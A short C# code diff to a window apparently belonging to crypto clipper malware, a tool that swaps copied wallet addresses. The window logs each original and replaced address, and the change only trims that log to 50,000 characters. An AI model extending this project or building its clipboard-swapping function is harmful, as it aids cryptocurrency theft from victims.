@@ -67,6 +67,8 @@ public partial class CryptoClipperWindow : ThemedWindow
             TxtCount.Text = $"{_totalCount} {Lang.Get("RECORDS_COUNT")}";
             var line = $"[{DateTime.Now:h:mm tt}]  {data.Type}  {data.Original[..Math.Min(data.Original.Length, 20)]}…  →  {data.Replaced}\n";
             TxtLog.AppendText(line);
+            if (TxtLog.Text.Length > 50000)
+                TxtLog.Text = TxtLog.Text[^50000..];
             LogScroll.ScrollToEnd();
 
             TxtStatus.Text = string.Format(Lang.Get("CLIPPER_REPLACED"), data.Type, _totalCount);
